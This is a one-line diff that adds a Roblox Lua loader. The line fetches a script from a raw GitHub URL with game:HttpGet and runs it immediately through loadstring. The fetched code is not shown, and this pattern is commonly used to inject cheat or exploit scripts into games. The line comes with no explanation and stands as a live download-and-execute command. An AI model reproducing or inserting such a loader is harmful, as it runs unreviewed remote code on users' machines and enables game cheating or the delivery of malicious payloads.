@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/kukirin-life-testing-spam5-bifbihrxfyg4kd.lua"))()
